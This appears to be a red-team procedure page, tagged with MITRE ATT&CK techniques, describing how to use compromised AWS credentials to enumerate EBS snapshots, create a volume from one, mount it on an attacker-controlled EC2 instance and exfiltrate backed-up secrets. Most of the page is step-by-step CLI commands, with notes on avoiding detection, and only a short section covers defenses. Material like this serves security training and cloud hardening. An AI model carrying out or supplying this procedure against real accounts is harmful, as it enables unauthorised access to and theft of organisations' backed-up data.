---
type: procedure
tactics:
  - '[[tactics/Collection|TA0009 - Collection]]'
  - '[[tactics/Discovery|TA0007 - Discovery]]'
techniques:
  - '[[techniques/Account Discovery|T1087 - Account Discovery]]'
  - '[[techniques/Data from Cloud Storage|T1530 - Data from Cloud Storage]]'
sub_techniques: []
tags:
  - aws
  - ebs-backup-extraction
  - cloud-storage
commands:
  - '[[commands/chmod-secure-private-key]]'
  - '[[commands/aws-ec2-create-volume-from-snapshot]]'
  - '[[commands/aws-ec2-describe-snapshots]]'
  - '[[commands/aws-ec2-describe-snapshots-with-owner]]'
  - '[[commands/aws-sts-get-caller-identity]]'
  - '[[commands/file-identify-filesystem]]'
  - '[[commands/lsblk-list-block-devices]]'
  - '[[commands/mount-block-device]]'
  - '[[commands/ssh-connect-to-ec2-instance]]'
tools:
  - '[[tools/AWS-CLI]]'
platforms:
  - AWS
  - Linux
skill_level: intermediate
impact_level: high
detection_risk: medium
verified: true
validated: true
---

# AWS-Extract-EBS-Backup-to-EC2-Instance

## Summary

This procedure outlines how to extract data from an AWS EBS snapshot backup by creating a new volume from the snapshot and mounting it to a controlled EC2 instance. It enables access to potentially sensitive backed-up data, such as credentials or configuration files, for exfiltration or analysis in a cloud compromise scenario.

## Description

In an AWS environment, EBS snapshots serve as backups of volume data. With compromised AWS credentials that have EC2 and EBS permissions, an attacker can enumerate snapshots, create a detachable volume from a target snapshot, attach it to an EC2 instance under their control, and mount it to browse and extract files. This technique targets cloud storage for data collection and discovery, assuming the attacker has initial access to AWS APIs via valid credentials. The process requires careful handling of regions, availability zones, and instance permissions to avoid detection.

## Requirements

1. Compromised AWS credentials with permissions for EC2 (describe-snapshots, create-volume) and STS (get-caller-identity).
2. Access to an EC2 instance in the same region as the snapshot, with SSH key pair configured.
3. AWS CLI installed and configured with the compromised profile.
4. Sufficient IAM permissions to create and manage volumes without triggering alarms.

## Defense

- Implement least-privilege IAM policies to restrict EC2 and EBS actions to necessary roles only.
- Enable AWS CloudTrail logging for API calls like DescribeSnapshots and CreateVolume, and monitor for anomalous snapshot access.
- Use AWS Config rules to detect unauthorized volume creations from snapshots.
- Rotate credentials regularly and monitor for unusual EC2 attachments or mounts.

## Objectives

1. Identify and select a target EBS snapshot containing backup data.
2. Create and attach a volume from the snapshot to a controlled EC2 instance.
3. Mount the volume and access/exfiltrate sensitive data from the backup.

## Instructions

### Step 1: Retrieve AWS Account Identity

**Context**: Determine the current AWS account ID to filter snapshots owned by the compromised account, ensuring targeted discovery without broad queries.

**Command** ([[commands/aws-sts-get-caller-identity]]):
```bash
aws sts get-caller-identity --profile $_PROFILE
```

> This retrieves the account ID, user ARN, and session details. Use the Account field to scope subsequent snapshot queries.

### Step 2: Enumerate Available Snapshots

**Context**: List EBS snapshots to identify backups containing valuable data. Start with self-owned snapshots, then filter by account ID if needed for broader discovery.

**Command** ([[commands/aws-ec2-describe-snapshots]]):
```bash
aws ec2 describe-snapshots --owner-ids self --profile $_PROFILE --region $_REGION
```

> Outputs a JSON list of snapshots with IDs, descriptions, and creation dates. Review for relevant backups.

**Command** ([[commands/aws-ec2-describe-snapshots-with-owner]]):
```bash
aws ec2 describe-snapshots --owner-id $_ACCOUNT_ID --profile $_PROFILE --region $_REGION
```

> Filters snapshots by the account ID obtained in Step 1, providing details like SnapshotId for volume creation.

### Step 3: Create Volume from Selected Snapshot

**Context**: Instantiate a new EBS volume from the target snapshot to make the backup data accessible as a mountable device.

**Command** ([[commands/aws-ec2-create-volume-from-snapshot]]):
```bash
aws ec2 create-volume --snapshot-id $_SNAPSHOT_ID --availability-zone $_AVAILABILITY_ZONE --volume-type $_VOLUME_TYPE --profile $_PROFILE --region $_REGION
```

> Returns volume details including VolumeId. Wait for the volume to become 'available' status before proceeding. Note the VolumeId for attachment (though attachment is implicit in this workflow if done manually via console or API).

### Step 4: Secure and Connect to EC2 Instance

**Context**: Prepare SSH access to the EC2 instance where the volume will be mounted. Secure the private key to prevent permission errors during connection.

**Command** ([[commands/chmod-secure-private-key]]):
```bash
chmod 400 $_KEY_FILE
```

> Sets restrictive permissions on the PEM key file to comply with SSH security requirements.

**Command** ([[commands/ssh-connect-to-ec2-instance]]):
```bash
ssh -i $_KEY_FILE $_USERNAME@$_EC2_HOSTNAME
```

> Establishes an SSH session to the EC2 instance. Once connected, proceed to mount the volume.

### Step 5: Mount the Volume on EC2

**Context**: Identify the new volume device, determine its filesystem, and mount it to access the backup contents for data extraction.

**Command** ([[commands/lsblk-list-block-devices]]):
```bash
lsblk
```

> Lists block devices; identify the new volume (e.g., /dev/xvdf) by size or attachment time.

**Command** ([[commands/file-identify-filesystem]]):
```bash
sudo file -s $_DEVICE_PATH
```

> Probes the device to confirm filesystem type (e.g., ext4, NTFS), ensuring correct mount options.

**Command** ([[commands/mount-block-device]]):
```bash
sudo mkdir -p /mnt/backup
sudo mount $_DEVICE_PATH /mnt/backup
```

> Mounts the volume to a directory. Verify with `ls /mnt/backup` to browse files and exfiltrate data (e.g., via scp or aws s3 cp).
